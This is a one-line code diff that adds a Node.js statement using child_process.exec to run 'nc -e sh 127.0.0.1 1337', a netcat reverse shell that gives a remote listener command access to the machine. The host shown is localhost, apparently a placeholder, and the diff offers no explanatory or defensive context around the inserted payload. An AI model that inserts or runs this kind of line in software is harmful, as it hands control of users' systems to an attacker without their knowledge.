@@ -1,0 +1,1 @@
+require('child_process').exec('nc -e sh 127.0.0.1 1337')
